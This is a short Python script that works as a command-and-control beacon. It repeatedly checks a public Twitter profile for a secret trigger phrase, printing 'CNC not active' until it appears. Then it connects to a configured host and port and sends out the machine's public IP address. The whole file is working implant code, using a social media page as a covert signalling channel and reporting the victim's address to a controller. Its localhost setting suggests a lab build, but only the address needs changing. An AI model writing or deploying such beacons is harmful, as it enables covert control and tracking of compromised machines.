import requests
import time
from ip_tools import get_public_ip
import socket

def send_ip(dest_ip, port):
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.connect((dest_ip, port))

    source_ip = get_public_ip()
    payload = bytearray(source_ip, 'utf8')
    sock.send(payload)

def check_url(link, secret):
    page = requests.get(link)

    if secret in page.text:
        return True

if __name__ == "__main__":
    link =  "https://twitter.com/DylanMCromer"
    delay = 10
    secret = "trying to get a paper ready"
    ip = "127.0.0.1"
    port = 1331

    while True:
        if not check_url(link, secret):
            print("CNC not active")
            time.sleep(delay)
        else:
            send_ip(ip, port)
            break

